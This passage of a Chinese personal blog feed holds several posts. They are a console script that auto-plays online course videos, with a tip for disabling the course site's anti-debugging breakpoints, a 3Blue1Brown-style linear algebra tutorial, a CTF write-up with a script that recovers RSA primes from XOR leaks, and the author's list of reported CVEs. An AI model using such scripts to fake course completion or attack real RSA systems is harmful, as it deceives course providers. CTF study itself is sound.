$(<span class="hljs-string">&quot;iframe&quot;</span>).<span class="hljs-title function_">contents</span>().<span class="hljs-title function_">find</span>(<span class="hljs-string">&quot;iframe&quot;</span>).<span class="hljs-title function_">contents</span>();<br>        <span class="hljs-comment">//播放函数</span><br>        <span class="hljs-keyword">var</span> play = <span class="hljs-keyword">function</span> (<span class="hljs-params"></span>) &#123;<br>            video.<span class="hljs-title function_">find</span>(<span class="hljs-string">&quot;#video &gt; button&quot;</span>).<span class="hljs-title function_">click</span>();<br>            <span class="hljs-keyword">var</span> jy = video.<span class="hljs-title function_">find</span>(<span class="hljs-string">&quot;#video &gt; div.vjs-control-bar &gt; div.vjs-volume-panel.vjs-control.vjs-volume-panel-vertical &gt; button&quot;</span>);<br>            <span class="hljs-keyword">if</span> (jy.<span class="hljs-title function_">attr</span>(<span class="hljs-string">&quot;title&quot;</span>) != <span class="hljs-string">&quot;取消静音&quot;</span>) &#123;<br>                jy.<span class="hljs-title function_">click</span>()<br>            &#125;<br>        &#125;<br>        <span class="hljs-comment">//如果正在加载</span><br>        <span class="hljs-keyword">var</span> load = video.<span class="hljs-title function_">find</span>(<span class="hljs-string">&quot;#loading&quot;</span>);<br>        <span class="hljs-keyword">if</span> (load.<span class="hljs-title function_">css</span>(<span class="hljs-string">&quot;visibility&quot;</span>) != <span class="hljs-string">&quot;hidden&quot;</span>) &#123;<br>            <span class="hljs-keyword">return</span>;<br>        &#125;<br>        <span class="hljs-comment">//获取当前进度</span><br>        <span class="hljs-keyword">var</span> spans = video.<span class="hljs-title function_">find</span>(<span class="hljs-string">&quot;#video &gt; div.vjs-control-bar &gt; div.vjs-progress-control.vjs-control &gt; div&quot;</span>).<span class="hljs-title function_">attr</span>(<span class="hljs-string">&quot;aria-valuenow&quot;</span>);<br>        <span class="hljs-comment">// 如果还没播放完</span><br>        <span class="hljs-keyword">if</span> (spans != <span class="hljs-number">100</span>) &#123;<br>            <span class="hljs-title function_">play</span>();<br>        &#125;<br>        $(<span class="hljs-string">&quot;#lfsenior&quot;</span>).<span class="hljs-title function_">html</span>(<span class="hljs-string">&quot;自动模式已开启,本章进度:&quot;</span> + spans + <span class="hljs-string">&quot;%&quot;</span>);<br>    &#125;, <span class="hljs-number">100</span>);<br> <br>&#125;);<br></code></pre></td></tr></table></figure><p>以Chrome为例，按F12打开Console，复制代码回车即可。</p><hr /><h2 id="更新">2019-10-18更新</h2><p>目前部分课程网站添加了前端反调试，表现为页面不断debugger，Chrome只需Ctrl+ F8禁止断点即可。</p>]]></content>
    
    
    <categories>
      
      <category>Software Development</category>
      
    </categories>
    
    
    <tags>
      
      <tag>javascript</tag>
      
      <tag>DOM Manipulation</tag>
      
      <tag>Automation</tag>
      
    </tags>
    
  </entry>
  
  
  
  <entry>
    <title>线性代数的本质（更新中）</title>
    <link href="/2019/06/30/The-essence-of-linear-algebra/"/>
    <url>/2019/06/30/The-essence-of-linear-algebra/</url>
    
    <content type="html"><![CDATA[<h1 id="序言">序言</h1><blockquote><p>There is hardly any theory which is more elementary than linearalgebra, in spite of the fact that generations of professors andtextbook writers have obscured its simplicity by preposterouscalculations with matrices.<br />尽管一批教授和教科书作者用关于矩阵的荒谬计算掩盖了<strong>线性代数</strong>的简明性，但鲜有比之更基本的理论。</p></blockquote><p>本文旨在拨开繁杂计算的迷雾，回归线性代数的几何本质。我们将一起探索核心概念背后的几何直观，理解它们为何如此运作，而不仅仅是记忆抽象的运算规则。将只停留在数值运算和公式的线性代数与<strong>可视化几何直观</strong>（VisualGeometric Intuition）结合，整理自<ahref="https://www.bilibili.com/video/av6731067/">3Blue1Brown的系列视频</a>。内容涉及到向量，线性变换，行列式，逆矩阵，点积与叉积，特征向量与特征值等，以及二次型，相似矩阵等补充内容，并辅以生动实例和讲解。</p><figure><img lazyloadsrc="/img/loading.gif" data-src="https://raw.githubusercontent.com/Mundi-Xu/picture_resource/master/picture/线性代数的本质/1-Application.jpg"alt="线性代数的应用" /><figcaption aria-hidden="true">线性代数的应用</figcaption></figure><h2 id="我们为什么需要几何直观">我们为什么需要几何直观</h2><p>在开始之前，想象学习一个事物（概念）的场景：我们需要学习<strong>正弦函数</strong><span class="math inline">sin (<em>x</em>)</span>，非常不幸的是，你遇到的教材告诉你，正弦函数是这样的：</p><p><span class="math display">$$\sin(x) = x - \frac{x^3}{3!} + \frac{x^5}{5!} + \cdots +(-1)^n\frac{x^{2n+1}}{(2n+1)!} + \cdots$$</span></p><p>看上去很厉害的样子，并且计算机也的确是这么计算 <spanclass="math inline">sin (<em>x</em>)</span> 的，而对你来说，计算 <spanclass="math inline">$\sin(\frac{\pi}{6})$</span> 可能就是把 <spanclass="math inline">$x = \frac{\pi}{6}$</span>代入公式，然后神奇的发现结果越算越接近<strong>0.5</strong> ，此时你对<span class="math inline">sin (<em>x</em>)</span>与三角形之间的几何直观只有一些模糊的概念，这样的学习就十分悲催了。为什么呢？再假设一个场景：<br />在学完 <span class="math inline">sin (<em>x</em>)</span>函数后，你又去参加了一个物理课程，正弦函数随处可见，其他人很快就能知道如何使用它并能得出大概值，而刚学完正弦函数的你内心戏大概是这样的：这群学物理的脑子也太强了！</p><p><img lazyload src="/img/loading.gif" data-src="https://raw.githubusercontent.com/Mundi-Xu/picture_resource/master/picture/线性代数的本质/1-sin.png" width = 60% alt="sin" div align="center" /></p><p>其实，你需要只是一个<strong>几何直观</strong>的灌输而已，这也从侧面佐证了一个好的老师或教材（<strong>这里的好老师真的不是他本身的学术能力有多强，而在于他擅不擅长站在学习者的角度不断的修正教学方法</strong>）是有多么重要。</p><p>教学不同层次的人：初学、入门、掌握、理解，解释的角度，方式都完全不同。更加不幸的是，为了能更加通用的用理论来描述现实生活中的规律，人类已经做了很多工作，我们常说：<strong>越通用，越抽象</strong>，这对于初学者来说堪称一段噩梦。</p><p>上述例子可能比较极端，但只为强调一件事：直观理解很重要，或者说，<strong>学习方法很重要</strong>。好的学习方法即你如何直观的去理解（可能是几何的，或是现实中的具体例子）一个抽象的事物，并<strong>层次化的建立知识与知识间的联系</strong>，构建并健壮属于自己的知识图谱。个人观点是，这种<strong>学习方法</strong>是最高效的。它唯一的要求在于，<strong>需要一定的基础知识</strong>打底，一定的量变结合方法论（点拨或领悟）就是质变。</p><h1 id="向量究竟是什么">向量究竟是什么</h1><blockquote><p>The introduction of numbers as <strong>coordinates</strong> is an actof violence.<br />引入一些数作为<strong>坐标</strong>是一种鲁莽的行为。</p></blockquote><h2 id="不同视角下的向量">不同视角下的向量</h2><p>对于向量的这个概念，大家一定并不陌生，但是这次让我们从<strong>数学</strong>，<strong>物理</strong>，<strong>计算机</strong>三个角度来看待如何定义这个<strong>向量</strong>这个概念。</p><h3 id="物理专业角度">物理专业角度</h3><ul><li>向量是<strong>空间中的箭头</strong></li><li>决定一个向量的是：<strong>它的长度和它所指的方向</strong></li></ul><h3 id="计算机专业角度">计算机专业角度</h3><ul><li>向量是有序的<strong>数字列表</strong></li><li>向量不过是“列表”一个花哨的说法</li><li>向量的<strong>维度</strong>等于“列表”的<strong>长度</strong></li></ul><h3 id="数学专业角度">数学专业角度</h3><p>对数学来说，它的本质就是通用和抽象，所以，数学家希望概括这两种观点:</p><ul><li>向量可以是任何东西，只需要保证：<strong>两个向量相加及数字与向量相乘有意义</strong></li><li><strong>向量加法</strong>和<strong>向量乘法</strong>贯穿线性代数始终，十分重要</li></ul><p align="center"><img lazyload src="/img/loading.gif" data-src="https://raw.githubusercontent.com/Mundi-Xu/picture_resource/master/picture/线性代数的本质/1-MathVector.png" width = 70% alt="vector" /></p><p>可以通过上图直观的感受到数学家在想什么。左边是物理角度，右边是计算机角度，但是很抱歉，<strong>我能用一些抽象的定义和约束让你们变成一个东西</strong>。</p><h2 id="坐标系">坐标系</h2><p>把向量置于坐标系中，以原点为起点，坐标正负表示方向，可完美把两个不同的角度融合。</p><ul><li>向量加法<ul><li>物理：首尾相连 (Motion)</li><li>计算机：坐标相加</li></ul></li><li>向量乘法<ul><li>物理：缩放 (Scaling)</li><li>计算机：坐标和比例相乘</li></ul></li></ul><p>实际上无论你怎么看待向量都无所谓，或把向量看作空间中的箭头，或把向量看作数字列表，线性代数的效用很少体现在这些观点中的其中一个上，而是更多的体现在它能够在这些观点中<strong>互相转化</strong>。线性代数为数据分析提供了一条将大量数据列表<strong>概念化、可视化</strong>的渠道，它能让数据样式变得非常明晰，并让你大致了解其特定运算的意义。同时，线性代数给物理学家和计算机图形程序员提供了一种方法去通过计算机能处理的数字来<strong>描述并操纵空间</strong>（例如<ahref="https://github.com/3b1b/manim">Mathematical AnimationEngine</a>)。</p><h1 id="线性组合基与其张成的空间">线性组合、基与其张成的空间</h1><blockquote><p>Mathematics requires a small dose, not of genius, but of an<strong>imaginative freedom</strong> which, in a larger dose, would beinsanity.数学需要的不是天赋，而是少量的<strong>自由想象</strong>，但想象太过自由又会陷入疯狂。</p></blockquote><p>本部分继续加深一个概念，为何<strong>向量加法与向量乘法</strong>是那么重要，并从始至终贯穿整个线性代数（关于后面的直观解释部分，强烈建议去<ahref="https://www.bilibili.com/video/av6731067/?p=3">原视频</a>观看动画演示）。</p><h2 id="线性组合">线性组合</h2><p>二维空间中任意两个<strong>不共线的非零向量</strong>都可以表示该空间中的任意一个向量，写成符号语言就是：<spanclass="math inline"><em>a</em><strong>v⃗</strong> + <em>b</em><strong>w⃗</strong></span>。</p><p align="center"><img lazyload src="/img/loading.gif" data-src="https://raw.githubusercontent.com/Mundi-Xu/picture_resource/master/picture/线性代数的本质/1-linear-comb.png" width = 65% alt="linear-comb" /></p><p>至于为什么被称为“线性”，有一种几何直观：如果你固定其中一个标量，让另一个标量自由变化，所产生的向量终点会描出一条直线。（这里其实很不严谨，具体定义请参阅课本。）</p><p align="center"><img lazyload src="/img/loading.gif" data-src="https://raw.githubusercontent.com/Mundi-Xu/picture_resource/master/picture/线性代数的本质/1-Linear.gif" width = 60% alt="Linear" /></p><h2 id="空间的基-basis">空间的基 (Basis)</h2><p>对于我们常见的笛卡尔坐标系，有一组最直观的基：<spanclass="math inline">{<em>ı̂</em>, <em>ȷ̂</em>}</span>，即单位向量 <spanclass="math inline"><em>ı̂</em> = (1, 0)</span> 和 <spanclass="math inline"><em>ȷ̂</em> = (0, 1)</span> ，通过 <spanclass="math inline"><em>ı̂</em></span> 和 <spanclass="math inline"><em>ȷ̂</em></span>的<strong>拉伸与相加</strong>可以组成笛卡尔坐标系中的任意一个向量。（上述的任意两个不共线的非零向量也可以作为二维空间的一组基。）</p><h3 id="张成的空间-span">张成的空间 (Span)</h3><p>同理，我们可以选择不同的基向量，而这些基向量构成的空间就称为其张成的空间。张成二字比较拗口，可以类比为<strong>延伸或扩展</strong>。直观来看，就是本文所有图中的网格。笛卡尔坐标系就是一个由单位坐标<span class="math inline">{<em>ı̂</em>, <em>ȷ̂</em>}</span>张成的空间（同时也是上述任意两个不共线的非零向量所张成的空间）。所有可以表示为给定向量（基）<strong>线性组合</strong>（刚刚讲了这个概念）的向量的集合，被称为给定向量（基）张成的空间。</p><p><img lazyload src="/img/loading.gif" data-src="https://raw.githubusercontent.com/Mundi-Xu/picture_resource/master/picture/线性代数的本质/1-span.png" width = 60% alt="span" div align=center /></p><p>如果你继续思考一下，会发现一个特点：<strong>并不是每一组给定向量都可以张成一个空间</strong>，若这两个向量共线（2D），共面（3D），它们就只能被限制在一个直线或面中，类似于“降维打击”（这也是我强调不共线且向量非零的原因）。通过这个直观的思考可以引出以下概念：</p><h3 id="线性相关">线性相关</h3><p>关于什么是线性相关，有两种表达：</p><ul><li>你有多个向量，并且可以<strong>移除其中一个而不减小张成的空间</strong>（即2D共线或3D共面），我们称它们（这些向量）线性相关。</li><li>其中一个向量，可以<strong>表示为其他向量的线性组合</strong>，因为这个向量已经落在其他向量张成的空间之中。</li></ul><p>从统计学角度来说，就是指这些向量之中有<strong>冗余</strong>。即在这一堆向量中，我们只需要其中几个（取决于维度）就可以表示所有其他的向量。<br />由此，我们可以得出以下部分：</p><h3 id="向量空间中一组基的严格定义">向量空间中一组基的严格定义</h3><p>向量空间的一组基是张成该空间的一个<strong>线性无关向量集</strong>。</p><blockquote><p>在线性代数中，基(basis)（也称为基底）是描述、刻画向量空间的基本工具。向量空间的基是它的一个特殊的子集，基的元素称为<strong>基向量</strong>。向量空间中<strong>任意一个元素</strong>，都可以<strong>唯一</strong>地表示成基向量的线性组合。如果基中元素个数有限，就称向量空间为有限维向量空间，将<strong>元素的个数</strong>称作向量空间的<strong>维数</strong>。使用基底可以便利地描述向量空间。</p></blockquote><p>用这样的步骤来慢慢导出这个定义，个人感觉，远比在课堂的第一分钟就将这句让你迷惑的话丢给你好的多，<strong>抽象的东西只有在慢慢推倒中你才能发现它的精巧之处，非常优雅且迷人</strong>。</p><h1 id="矩阵与线性变换">矩阵与线性变换</h1><blockquote><p>Unfortunately, no one can be told what the <strong>Matrix</strong>is. You have to <strong>see it for yourself</strong>.<br />很遗憾，<strong>矩阵</strong>是什么是说不清的。你必须得自己亲眼看看。</p></blockquote><p>矩阵，最直观的理解当然是一个<strong>写成方阵的数字</strong> <spanclass="math inline">$\begin{pmatrix}1&amp;0 \\\ 0&amp;1\end{pmatrix}$</span>，这几节的核心是为了说明：矩阵其实就是一种<strong>向量变换</strong>（至于什么是变换下面会讲），并附带一种不用死记硬背的考虑矩阵向量乘法的方法。</p><h2 id="变换">变换</h2><p><strong>变换</strong>本质上是<strong>函数</strong>（下左图）的一种花哨的说法，它接受输入内容，并输出对应结果，特别的，在矩阵变换（下右图）中，我们接受一个向量并且输出另一个向量。</p><p align="center"><img lazyload src="/img/loading.gif" data-src="https://raw.githubusercontent.com/Mundi-Xu/picture_resource/master/picture/线性代数的本质/1-fun.gif" style="zoom:67%;" /></p><p align="center"><img lazyload src="/img/loading.gif" data-src="https://raw.githubusercontent.com/Mundi-Xu/picture_resource/master/picture/线性代数的本质/1-trans.gif" style="zoom:67%;" /></p><p>那既然<strong>变换</strong>和<strong>函数</strong>意义相同，为什么要用多余的术语困惑我们呢？因为使用<strong>变换</strong>是在暗示以特定方式来可视化这一<strong>输入<spanclass="math inline">→</span>输出关系</strong>。一种理解“向量的函数”的方法就是就是使用<strong>运动</strong>。</p><p align="center"><img lazyload src="/img/loading.gif" data-src="https://raw.githubusercontent.com/Mundi-Xu/picture_resource/master/picture/线性代数的本质/1-movement.gif" width = 70% alt="motion" /></p><p>这世界上有非常多优美的变换，如果你将他们可视化，就能得到下图：</p><figure><img lazyloadsrc="/img/loading.gif" data-src="https://raw.githubusercontent.com/Mundi-Xu/picture_resource/master/picture/线性代数的本质/2-trans.gif"alt="2-trans" /><figcaption aria-hidden="true">2-trans</figcaption></figure><h2 id="线性变换">线性变换</h2><p>我们说具有以下两个性质的就是线性变换（直观可视化如下图）：</p><ul><li>直线在变换后仍然<strong>保持为直线</strong>，不能有所弯曲。</li><li><strong>原点必须保持固定</strong></li></ul><p><img lazyload src="/img/loading.gif" data-src="https://raw.githubusercontent.com/Mundi-Xu/picture_resource/master/picture/线性代数的本质/3-trans.gif" width = 67% /></p><p>用一句话总结就是：线性变换是<strong>保持网格线平行且等距分布</strong>的变换（如果变换后保持直线不变但原点改变则为仿射变换，即<strong>线性变换+平移</strong>）。</p><h2 id="如何用数值描述线性变换">如何用数值描述线性变换</h2><p>这里需要使用上一节提到的工具，<strong>空间的基</strong>，也就是单位向量（基向量）：<spanclass="math inline"><em>ı̂</em> = (1, 0)</span> 和 <spanclass="math inline"><em>ȷ̂</em> = (0, 1)</span></p><p>对线性变换，我们只需要关注两个<strong>基向量</strong> <spanclass="math inline"><em>ı̂</em></span> 和 <spanclass="math inline"><em>ȷ̂</em></span><strong>变换后的位置</strong>即可。例如，<spanclass="math inline"><em>ı̂</em></span> 变换到 <spanclass="math inline">(3, 1)</span> 的位置，<spanclass="math inline"><em>ȷ̂</em></span> 变换到 <spanclass="math inline">(1, 2)</span> 的位置,将 <spanclass="math inline"><em>ı̂</em></span><strong>变换后的坐标</strong>竖起来作为方阵的第一列（绿色表示）， <spanclass="math inline"><em>ȷ̂</em></span><strong>变换后的坐标</strong>竖起来作为方阵的第二列（红色表示），得到矩阵<spanclass="math inline">$\begin{pmatrix}\color{green}3&amp;\color{red}1 \\\\color{green}1&amp;\color{red}2 \end{pmatrix}$</span>。假设我们想要知道目标向量 <span class="math inline">(−1, 2)</span>进行变换后的位置，那么这个矩阵就是对<strong>变换过程</strong>最好的描述，一图胜千言。</p><p><img lazyload src="/img/loading.gif" data-src="https://raw.githubusercontent.com/Mundi-Xu/picture_resource/master/picture/线性代数的本质/1-matrix.gif" width = 75% alt="matrix" div align=center /></p><ul><li>Step1： 绿色 <spanclass="math inline"><em>ı̂</em></span>（x轴）进行移动（变换）</li><li>Step2： 红色 <spanclass="math inline"><em>ȷ̂</em></span>（y轴）进行移动（变换）</li><li>Step3： 目标向量x轴<strong>坐标值</strong>与 <spanclass="math inline"><em>ı̂</em></span><strong>变换后向量</strong>进行<strong>向量乘法</strong></li><li>Step4： 目标向量y轴<strong>坐标值</strong>与 <spanclass="math inline"><em>ȷ̂</em></span><strong>变换后向量</strong>进行<strong>向量乘法</strong></li><li>Step5： 两者进行<strong>向量加法</strong>，得到线性变换结果</li></ul><p>更加一般的情况，我们用变量来代替其中的具体值，其中绿色代表<spanclass="math inline"><em>ı̂</em></span>变换后的向量，红色代表<spanclass="math inline"><em>ȷ̂</em></span>变换后的向量：</p><p><span class="math display">$$\begin{pmatrix}\color{green}a&amp;\color{red}b \\\\color{green}c&amp;\color{red}d \end{pmatrix}\begin{pmatrix} x \\\y\end{pmatrix} = \underbrace{x \begin{pmatrix}\color{green}a \\\\color{green}c \end{pmatrix} +  y \begin{pmatrix} \color{red}b \\\\color{red}d \end{pmatrix}}_{\text{直观的部分这里}} =\begin{pmatrix}\color{green}{a}\color{black}{x}+\color{red}{b}\color{black}{y}\\\\color{green}{c}\color{black}{x}+\color{red}{d}\color{black}{y}\end{pmatrix}$$</span></p><p>上面的公式就是我们常说的<strong>矩阵乘法公式</strong>，现在，不要强行背诵，结合可视化的直观动图，你一辈子都不会忘记的。</p><h2 id="线性的严格定义">线性的严格定义</h2><p>在给出一个数学化抽象的解释前，先做一下总结：</p><ul><li><strong>线性变换</strong>是操纵<strong>空间</strong>的一种手段，它<strong>保持网格线平行且等距分布，并保持原点不动</strong></li><li><strong>矩阵</strong>是描述这种<strong>变换</strong>的一组数字，或者说一种<strong>描述线性变换的语言</strong></li></ul><p>在数学上，<strong>线性</strong>的严格定义如下述公式，这些性质，会在之后进行讨论，也可以在这里就进行一些思考，为什么说向量加法和向量乘法贯穿线性代数始终？</p><p><span class="math display">$$\begin{align*}L(\mathbf{\vec v} + \mathbf{\vec w}) &amp;= L(\mathbf{\vec v}) +L(\mathbf{\vec w}) \qquad \text{可加性（对加法封闭）} \\L(c\mathbf{\vec v}) &amp;= cL(\mathbf{\vec v}) \qquad\text{成比例（对数乘封闭）}\end{align*}$$</span></p><h1 id="矩阵乘法与线性变换复合">矩阵乘法与线性变换复合</h1><blockquote><p>It is my experience that proofs involving matrices can be shortenedby 50% if one throws the matrices out.<br />据我的经验，如果<strong>丢掉矩阵</strong>的话，那些涉及<strong>矩阵</strong>的证明可以缩短一半。</p></blockquote><h2 id="复合变换">复合变换</h2><p>如果对一个向量先进行一次旋转变换，再进行一次剪切变换（<spanclass="math inline"><em>ı̂</em></span> 保持 <spanclass="math inline">(1, 0)</span> 不变，<spanclass="math inline"><em>ȷ̂</em></span> 移动到坐标 <spanclass="math inline">(1, 1)</span>），如下图所示：</p><p><img lazyload src="/img/loading.gif" data-src="https://raw.githubusercontent.com/Mundi-Xu/picture_resource/master/picture/线性代数的本质/1-comp.png" width = 75% alt="matrix" div align=center /></p><p>那么如果通过旋转矩阵和剪切矩阵来求得这个符合矩阵呢？为了解决这个问题，我们定义这个过程叫做<strong>矩阵的乘法</strong>。</p><h2 id="矩阵乘法的计算">矩阵乘法的计算</h2><p>在这里我们发现，矩阵乘法的变换顺序是<strong>从右往左读的</strong>（这一个常识很重要，你得明白这一点，有基本概念），也和我们熟知的复合函数形式<span class="math inline"><em>f</em>(<em>g</em>(<em>x</em>))</span>是一致的。</p><p>那么如何求解矩阵乘法呢？对线性代数有印象的同学现在能马上记起来那个稍显复杂的公式吗？如果有些忘记了，那么，现在，就有一个一辈子也忘不了的直观解释方法：</p><p><img lazyload src="/img/loading.gif" data-src="https://raw.githubusercontent.com/Mundi-Xu/picture_resource/master/picture/线性代数的本质/1-cal.gif" width = 75% alt="cal" div align=center /></p><p>如图，<span class="math inline"><em>M</em><sub>1</sub></span>矩阵的第一列表示的是 <span class="math inline"><em>ı̂</em></span>变换的位置，先把它拿出来，<spanclass="math inline"><em>M</em><sub>2</sub></span> 矩阵看成对这个变换过的<span class="math inline"><em>ı̂</em></span>进行一次变换（按照前文的规则）。同理，针对 <spanclass="math inline"><em>ȷ̂</em></span>做一样的操作，就可以得出这个表达式。</p><h2 id="矩阵乘法的运算规律">矩阵乘法的运算规律</h2><p>通常学生在学习矩阵乘法时都会记住上述公式并通过一些特定的运算加强记忆（包括我），但是在记忆这个过程前，我希望你能养成<strong>思考矩阵乘法意义</strong>的习惯，也就是<strong>两个变换相继作用</strong>。这能形成一个更好的概念性框架，并让你更容易理解矩阵乘积的性质。<br />举个栗子，矩阵相乘时，它们的先后顺序影响结果吗？有了上面的想法，可以自己试着在不进行计算的条件下思考一下，然后再尝试证明<strong>结合律</strong>与<strong>分配律</strong>是否成立。你会发现，原来线性代数是这么的直观，完全<strong>不需要计算</strong>。</p><h1 id="未完待续">未完待续</h1><figure><img lazyloadsrc="/img/loading.gif" data-src="https://raw.githubusercontent.com/Mundi-Xu/picture_resource/master/picture/通用/拖更.png"alt="waiting" /><figcaption aria-hidden="true">waiting</figcaption></figure>]]></content>
    
    
    <categories>
      
      <category>Life &amp; Study</category>
      
    </categories>
    
    
    <tags>
      
      <tag>Linear Algebra</tag>
      
      <tag>Mathematics</tag>
      
      <tag>3Blue1Brown</tag>
      
      <tag>Geometric Intuition</tag>
      
    </tags>
    
  </entry>
  
  
  
  <entry>
    <title>一种神奇的rsa加密算法</title>
    <link href="/2018/11/29/A-magic-rsa-encryption-algorithm/"/>
    <url>/2018/11/29/A-magic-rsa-encryption-algorithm/</url>
    
    <content type="html"><![CDATA[<hr /><p><strong>新的算法并没有透露<code>n</code>，只给定了两个大整数：<code>(p*q)^(p+q)</code> 和<code>(p*q)^(p-q)</code>，其中 <code>^</code>是按位异或运算。</strong><sup id="fnref:1" class="footnote-ref"><a href="#fn:1" rel="footnote"><spanclass="hint--top hint--rounded"aria-label="hackergame2018-RSA_of_Z">[1]</span></a></sup></p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre><code class="hljs python"><span class="hljs-keyword">import</span> sympy<br><br>p = sympy.randprime(<span class="hljs-number">2</span> ** <span class="hljs-number">1023</span>, <span class="hljs-number">2</span> ** <span class="hljs-number">1024</span>)<br>q = sympy.randprime(<span class="hljs-number">2</span> ** <span class="hljs-number">1023</span>, <span class="hljs-number">2</span> ** <span class="hljs-number">1024</span>)<br><br>a = (p * q) ^ (p + q)<br>b = (p * q) ^ (p - q)<br><br>flag = <span class="hljs-built_in">open</span>(<span class="hljs-string">&#x27;flag.txt&#x27;</span>, <span class="hljs-string">&#x27;rb&#x27;</span>).read()<br>m = <span class="hljs-built_in">int</span>.from_bytes(flag, <span class="hljs-string">&#x27;big&#x27;</span>)<br><br><span class="hljs-built_in">print</span>(a, b, <span class="hljs-built_in">pow</span>(m, <span class="hljs-number">65537</span>, p * q))<br></code></pre></td></tr></table></figure><hr /><h2 id="年12月20日更新">2018年12月20日更新</h2><p>我们定义 $ f_1(x,y) = (x y)^{(x+y)} 和 f_2(x,y) = (x y)^{(x-y)} $，我们发现这两个函数都有一个共同的性质，就是函数值的最低 n个二进制位只和 x、y 的最低 n 个二进制位有关。也就是说，我们可以用 a 和 b的最低 n 位来判断 p 和 q 的最低 n 位是否可能正确。如果它们的最低 n位满足 $ f_1 $和 <span class="math inline"><em>f</em><sub>2</sub></span>函数，那么它们就是 p 和 q低位的候选答案；如果不满足，它们就根本不可能是真正 p 和 q的低位。所以我们可以从一个二进制位（n=1）开始，每次增加一位。每增加一位时，我们把原来满足条件的p 和 q 低位的每种可能情况分别在前面加上 0 或 1，这样每种情况就变成了 4种新的情况，然后对所有新的情况用 $ f_1 $ 和 $ f_2 $函数提供的约束条件进行过滤，只保留满足条件的情况。当跑到 1024位的时候，就只会剩下真正满足条件的 p 和 q 了。然后，我们根据 RSA的原理，在 mod (p-1)*(q-1) 的意义下对 e 求逆元，得到私钥 d，计算 pow(c,d, p*q)即可得到 flag 的大整数表示。</p><p><strong>求解脚本如下</strong></p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br></pre></td><td class="code"><pre><code class="hljs python"><span class="hljs-keyword">import</span> gmpy2<br><br>a, b, c = [<span class="hljs-built_in">int</span>(s) <span class="hljs-keyword">for</span> s <span class="hljs-keyword">in</span> <span class="hljs-built_in">open</span>(<span class="hljs-string">&#x27;output.txt&#x27;</span>).read().split()]<br><span class="hljs-comment">#假设已将加密内容保存到 output.txt 文件中</span><br><br>f1 = <span class="hljs-keyword">lambda</span> p, q: (p * q) ^ (p + q)<br>f2 = <span class="hljs-keyword">lambda</span> p, q: (p * q) ^ (p - q)<br><br>candidates = &#123;(<span class="hljs-number">0</span>, <span class="hljs-number">0</span>)&#125;<br><br><span class="hljs-keyword">for</span> m <span class="hljs-keyword">in</span> <span class="hljs-built_in">range</span>(<span class="hljs-number">1025</span>):<br>    <span class="hljs-built_in">print</span>(m, <span class="hljs-built_in">len</span>(candidates))<br>    candidates_ = <span class="hljs-built_in">set</span>()<br>    mask = (<span class="hljs-number">2</span> &lt;&lt; m) - <span class="hljs-number">1</span><br>    <span class="hljs-keyword">for</span> x, y <span class="hljs-keyword">in</span> candidates:<br>        <span class="hljs-keyword">if</span> f1(x, y) == a <span class="hljs-keyword">and</span> f2(x, y) == b:<br>            p, q = x, y<br>            d = gmpy2.invert(<span class="hljs-number">65537</span>, (p - <span class="hljs-number">1</span>) * (q - <span class="hljs-number">1</span>))<br>            m = <span class="hljs-built_in">pow</span>(c, d, p * q)<br>            <span class="hljs-built_in">print</span>(<span class="hljs-built_in">bytes</span>.fromhex(<span class="hljs-built_in">hex</span>(m)[<span class="hljs-number">2</span>:]))<br>            exit()<br>        <span class="hljs-keyword">for</span> bx <span class="hljs-keyword">in</span> <span class="hljs-built_in">range</span>(<span class="hljs-number">2</span>):<br>            <span class="hljs-keyword">for</span> by <span class="hljs-keyword">in</span> <span class="hljs-built_in">range</span>(<span class="hljs-number">2</span>):<br>                xx = x + (bx &lt;&lt; m)<br>                yy = y + (by &lt;&lt; m)<br>                <span class="hljs-keyword">if</span> f1(xx, yy) &amp; mask != a &amp; mask:<br>                    <span class="hljs-keyword">continue</span><br>                <span class="hljs-keyword">if</span> f2(xx, yy) &amp; mask != b &amp; mask:<br>                    <span class="hljs-keyword">continue</span><br>                candidates_.add((xx, yy))<br>candidates = candidates_<br></code></pre></td></tr></table></figure><p><strong>有几个人做出来了呢（坏笑:）</strong></p><section class="footnotes"><div class="footnote-list"><ol><li><span id="fn:1" class="footnote-text"><span>hackergame2018-RSA_of_Z<a href="#fnref:1" rev="footnote" class="footnote-backref">↩︎</a></span></span></li></ol></div></section>]]></content>
    
    
    <categories>
      
      <category>CTF</category>
      
    </categories>
    
    
    <tags>
      
      <tag>Cryptography</tag>
      
      <tag>CTF</tag>
      
      <tag>rsa</tag>
      
    </tags>
    
  </entry>
  
  
  
  <entry>
    <title>Hello World</title>
    <link href="/2018/10/25/hello-world/"/>
    <url>/2018/10/25/hello-world/</url>
    
    <content type="html"><![CDATA[<p>Dedicated to vulnerability research at Ant Security Light-Year Lab,with a current focus on LLM Security and its intersection withtraditional binary and system-level security..</p><hr /><p>Below is a list of vulnerabilities that I have identified andreported to vendors:</p><blockquote><p>All vulnerability research conducted during my employment at Huawei(2022.08–2025.04) remains under corporate nondisclosure protocols and isexcluded from this vulnerability portfolio.</p></blockquote><p><strong>Year – 2021</strong></p><p><strong>Chromium:</strong></p><ul><li><strong>CVE-2021-37972</strong> : Out of bounds read inlibjpeg-turbo</li></ul><p><strong>LibRaw:</strong></p><ul><li><strong>CVE-2021-38236</strong> : heap-buffer-overflow inraw2image.cpp</li><li><strong>CVE-2021-38235</strong> : heap-buffer-overflow infp_dng.cpp</li></ul><p><strong>北京数科网维技术有限责任公司 OFD 版式阅读器:</strong></p><ul><li><strong>CNVD-2021-102082, CNNVD-202111-2224,CNNVD-202111-2225</strong> : Integer Overflow to Buffer Overflow inpdfdom.dll</li><li><strong>CNVD-2022-00039, 